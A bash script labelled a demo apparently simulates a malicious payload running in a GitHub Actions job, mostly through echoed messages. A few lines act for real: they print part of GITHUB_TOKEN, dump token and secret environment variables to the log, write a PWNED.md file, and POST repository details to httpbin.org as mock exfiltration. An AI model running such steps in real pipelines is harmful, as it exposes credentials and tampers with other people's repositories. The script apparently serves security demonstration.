#!/bin/bash

# 🚨 MALICIOUS SCRIPT - FOR DEMO PURPOSES ONLY
# This script demonstrates what an attacker could do

echo "🚨 ATTACK SIMULATION STARTED"
echo "================================"

echo "📍 Current directory: $(pwd)"
echo "👤 Running as user: $(whoami)"
echo "🔑 GitHub Token available: ${GITHUB_TOKEN:0:10}..."

echo ""
echo "🎯 ATTACK CAPABILITIES:"
echo "1. Can read repository files"
echo "2. Can modify repository content"
echo "3. Can access secrets (in some cases)"
echo "4. Can create commits and push changes"

echo ""
echo "💀 SIMULATED MALICIOUS ACTIONS:"

# Simulate data exfiltration
echo "📤 Exfiltrating repository information..."
echo "Repository: $GITHUB_REPOSITORY"
echo "Event: $GITHUB_EVENT_NAME"
echo "Actor: $GITHUB_ACTOR"

# Simulate file modification
echo "📝 Creating malicious file..."
echo "# This file was created by an attacker" > PWNED.md
echo "Repository compromised at $(date)" >> PWNED.md

# Simulate secret access attempt
echo "🔍 Attempting to access environment variables..."
env | grep -E "(GITHUB_|SECRET_|TOKEN)" | head -5

# Simulate network request (safe for demo)
echo "🌐 Simulating data exfiltration..."
curl -X POST https://httpbin.org/post \
     -H "Content-Type: application/json" \
     -d "{\"message\":\"Demo attack from $GITHUB_REPOSITORY\",\"timestamp\":\"$(date)\"}" \
     --max-time 5 || echo "Network request failed (expected in demo)"

echo ""
echo "🚨 ATTACK SIMULATION COMPLETED"
echo "In a real attack, sensitive data would be stolen!"
echo "================================"
